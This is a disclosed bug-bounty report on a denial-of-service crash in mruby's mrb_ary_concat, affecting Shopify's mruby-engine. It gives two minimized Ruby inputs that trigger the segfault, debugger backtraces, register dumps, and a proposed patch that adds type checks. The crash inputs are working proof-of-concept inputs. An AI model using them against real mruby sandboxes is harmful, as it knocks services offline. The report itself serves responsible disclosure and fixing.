# Denial of service due to invalid memory access in mrb_ary_concat

## Report Details
- **Report ID**: 184712
- **URL**: https://hackerone.com/reports/184712
- **State**: Closed
- **Severity**: high
- **Submitted**: 2016-11-24T04:35:19.514Z
- **Disclosed**: 2016-12-17T20:07:10.168Z

## Reporter
- **Username**: haquaman
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify-scripts

## Vulnerability Information
Hi,

The following file causes a segmentation fault in mruby, which also causes a segmentation fault in mruby-engine. I've minimized this file down to the bare bones what crashes it, then renamed variables and tidied so you can see what is needed and what isn't.

```
case ""
  when 0
end
x *case
  when true
    * = 0
end
```

Also this file causes the same issue:

```
case ""
  when 0
end
x = *case
  when 0
    * = 0
end
```

Difference between the two is one is a method call, and one is assignment.

```
$ ./dev/bin/mruby --version
mruby 1.2.0 (2015-11-17)
```

```
$ ./dev/bin/mruby crash-1.rb
crash-1.rb:4:3: '*' interpreted as argument prefix
Segmentation fault: 11
```

```
$ lldb ./dev/bin/mruby crash-1.rb
(lldb) target create "./dev/bin/mruby"
Current executable set to './dev/bin/mruby' (x86_64).
(lldb) settings set -- target.run-args  "crash-1.rb"
(lldb) r
Process 54552 launched: './dev/bin/mruby' (x86_64)
crash-1.rb:4:3: '*' interpreted as argument prefix
Process 54552 stopped
* thread #1: tid = 0x652cabc, 0x0000000100001837 mruby`ary_modify + 55, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x4800000019)
    frame #0: 0x0000000100001837 mruby`ary_modify + 55
mruby`ary_modify:
->  0x100001837 <+55>: cmpl   $0x1, (%rax)
    0x10000183a <+58>: jne    0x100001889               ; <+137>
    0x100001840 <+64>: movq   -0x10(%rbp), %rax
    0x100001844 <+68>: movq   0x28(%rax), %rax
(lldb) bt
* thread #1: tid = 0x652cabc, 0x0000000100001837 mruby`ary_modify + 55, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x4800000019)
  * frame #0: 0x0000000100001837 mruby`ary_modify + 55
    frame #1: 0x0000000100001ca1 mruby`ary_concat + 49
    frame #2: 0x0000000100001c66 mruby`mrb_ary_concat + 70
    frame #3: 0x000000010004263f mruby`mrb_vm_exec + 25439
    frame #4: 0x000000010003c2c7 mruby`mrb_vm_run + 135
    frame #5: 0x00000001000446b4 mruby`mrb_top_run + 100
    frame #6: 0x000000010006f19f mruby`load_exec + 1183
    frame #7: 0x000000010006ece3 mruby`mrb_load_file_cxt + 67
    frame #8: 0x0000000100000d78 mruby`main + 904
    frame #9: 0x00007fff8a9db5ad libdyld.dylib`start + 1
    frame #10: 0x00007fff8a9db5ad libdyld.dylib`start + 1
(lldb) register read
General Purpose Registers:
       rax = 0x0000004800000019
       rbx = 0x0000000000000000
       rcx = 0x0000000000200086
       rdx = 0x0000000100000000  mruby`_mh_execute_header
       rdi = 0x00000001002029f0
       rsi = 0x0000000100000000  mruby`_mh_execute_header
       rbp = 0x00007fff5fbfc9d0
       rsp = 0x00007fff5fbfc9a0
        r8 = 0x0000000000000001
        r9 = 0x0000000000000000
       r10 = 0x0000000000000001
       r11 = 0x0000000100200000
       r12 = 0x0000000000000000
       r13 = 0x0000000000000000
       r14 = 0x0000000000000000
       r15 = 0x0000000000000000
       rip = 0x0000000100001837  mruby`ary_modify + 55
    rflags = 0x0000000000010206
        cs = 0x000000000000002b
        fs = 0x0000000000000000
        gs = 0x0000000000000000

(lldb) q
Quitting LLDB will kill one or more processes. Do you really want to proceed: [Y/n] y

```

and the second file:

```
$ ./dev/bin/mruby crash-2.rb
Segmentation fault: 11
```

```
$ lldb ./dev/bin/mruby crash-2.rb
(lldb) target create "./dev/bin/mruby"
Current executable set to './dev/bin/mruby' (x86_64).
(lldb) settings set -- target.run-args  "crash-2.rb"
(lldb) r
Process 66755 launched: './dev/bin/mruby' (x86_64)
Process 66755 stopped
* thread #1: tid = 0x652fc10, 0x0000000100001837 mruby`ary_modify + 55, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x4800000019)
    frame #0: 0x0000000100001837 mruby`ary_modify + 55
mruby`ary_modify:
->  0x100001837 <+55>: cmpl   $0x1, (%rax)
    0x10000183a <+58>: jne    0x100001889               ; <+137>
    0x100001840 <+64>: movq   -0x10(%rbp), %rax
    0x100001844 <+68>: movq   0x28(%rax), %rax
(lldb) bt
* thread #1: tid = 0x652fc10, 0x0000000100001837 mruby`ary_modify + 55, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x4800000019)
  * frame #0: 0x0000000100001837 mruby`ary_modify + 55
    frame #1: 0x0000000100001ca1 mruby`ary_concat + 49
    frame #2: 0x0000000100001c66 mruby`mrb_ary_concat + 70
    frame #3: 0x000000010004263f mruby`mrb_vm_exec + 25439
    frame #4: 0x000000010003c2c7 mruby`mrb_vm_run + 135
    frame #5: 0x00000001000446b4 mruby`mrb_top_run + 100
    frame #6: 0x000000010006f19f mruby`load_exec + 1183
    frame #7: 0x000000010006ece3 mruby`mrb_load_file_cxt + 67
    frame #8: 0x0000000100000d78 mruby`main + 904
    frame #9: 0x00007fff8a9db5ad libdyld.dylib`start + 1
    frame #10: 0x00007fff8a9db5ad libdyld.dylib`start + 1
(lldb) register read
General Purpose Registers:
       rax = 0x0000004800000019
       rbx = 0x0000000000000000
       rcx = 0x0000000000200086
       rdx = 0x0000000100000000  mruby`_mh_execute_header
       rdi = 0x00000001002029f0
       rsi = 0x0000000100000000  mruby`_mh_execute_header
       rbp = 0x00007fff5fbfc9d0
       rsp = 0x00007fff5fbfc9a0
        r8 = 0x0000000000000001
        r9 = 0x0000000000000000
       r10 = 0x0000000000000001
       r11 = 0x0000000100700000
       r12 = 0x0000000000000000
       r13 = 0x0000000000000000
       r14 = 0x0000000000000000
       r15 = 0x0000000000000000
       rip = 0x0000000100001837  mruby`ary_modify + 55
    rflags = 0x0000000000010206
        cs = 0x000000000000002b
        fs = 0x0000000000000000
        gs = 0x0000000000000000

(lldb) q
Quitting LLDB will kill one or more processes. Do you really want to proceed: [Y/n] y

```

I took a look at the cause in the codegeneration, ... and gave up. But in the `src/array.c` I could fix these two issues with one patch, as follows:

```
diff --git a/src/array.c b/src/array.c
index 5a319d8..4814968 100644
--- a/src/array.c
+++ b/src/array.c
@@ -259,6 +259,15 @@ ary_concat(mrb_state *mrb, struct RArray *a, mrb_value *ptr, mrb_int blen)
 MRB_API void
 mrb_ary_concat(mrb_state *mrb, mrb_value self, mrb_value other)
 {
+  if (!mrb_array_p(self)) {
+    mrb_raisef(mrb, E_TYPE_ERROR, "expecting Array, got %S", mrb_obj_value(mrb_obj_class(mrb, self)));
+    return;
+  }
+  if (!mrb_array_p(other)) {
+    mrb_raisef(mrb, E_TYPE_ERROR, "expecting Array, got %S", mrb_obj_value(mrb_obj_class(mrb, other)));
+    return;
+  }
+
   struct RArray *a2 = mrb_ary_ptr(other);
 
   ary_concat(mrb, mrb_ary_ptr(self), a2->ptr, a2->len);
```

As mentioned above, both these files affect mruby-engine as well:

```
./bin/sandbox:20: [BUG] Segmentation fault at 0x00000000000019
ruby 2.3.0p0 (2015-12-25 revision 53290) [x86_64-darwin15]

-- Crash Report log information --------------------------------------------
   See Crash Report log file under the one of following:
     * ~/Library/Logs/CrashReporter
     * /Library/Logs/CrashReporter
     * ~/Library/Logs/DiagnosticReports
     * /Library/Logs/DiagnosticReports
   for more details.
Don't forget to include the above Crash Report log file in bug reports.

-- Control frame information -----------------------------------------------
c:0003 p:---- s:0010 e:000009 CFUNC  :sandbox_eval
c:0002 p:0201 s:0005 E:0006b8 EVAL   ./bin/sandbox:20 [FINISH]
c:0001 p:0000 s:0002 E:002310 (none) [FINISH]

-- Ruby level backtrace information ----------------------------------------
./bin/sandbox:20:in `<main>'
./bin/sandbox:20:in `sandbox_eval'

-- Machine register context ------------------------------------------------
 rax: 0x000000011061c3f0 rbx: 0x0000000110674668 rcx: 0x0000000000000004
 rdx: 0x000000011061c3f0 rdi: 0x0000000110614440 rsi: 0x0000000000000001
 rbp: 0x00007fff50037f40 rsp: 0x00007fff50037f10  r8: 0x0000000000000003
  r9: 0x0000000000000000 r10: 0x0000000000000000 r11: 0x00000001106145a8
 r12: 0x00000001106145a8 r13: 0x000000011063b2f0 r14: 0x0000000000000001
 r15: 0x0000000000000001 rip: 0x00000001104f233d rfl: 0x0000000000010246

-- C level backtrace information -------------------------------------------
0   ruby                                0x000000010fd645d4 rb_vm_bugreport + 388
1   ruby                                0x000000010fc06023 rb_bug_context + 483
2   ruby                                0x000000010fcd9653 sigsegv + 83
3   libsystem_platform.dylib            0x00007fff9826d52a _sigtramp + 26
4   mruby_engine.bundle                 0x00000001104f233d mrb_ary_concat + 29
5   ???                                 0x0000000110614440 0x0 + 4569777216

-- Other runtime information -----------------------------------------------

* Loaded script: ./bin/sandbox

* Loaded features:

    0 enumerator.so
    1 thread.rb
    2 rational.so
    3 complex.so
<snip various gems>
  185 /Users/<snip>/mruby-engine/lib/mruby_engine/mruby_engine.bundle
  186 /Users/<snip>/mruby-engine/lib/mruby_engine.rb

[NOTE]
You may have encountered a bug in the Ruby interpreter or extension libraries.
Bug reports are welcome.
For details: http://www.ruby-lang.org/bugreport.html

```

The second file produced same backtrace, but different register values.

After applying that patch to `ext/mruby_engine/mruby` and recompiling, these two files no longer crash.

If you end up finding a better patch elsewhere for the root cause, can you let me know what you end up applying so I can change what I fuzz against?

Cheers,

Hugh

## Attachments
No attachments
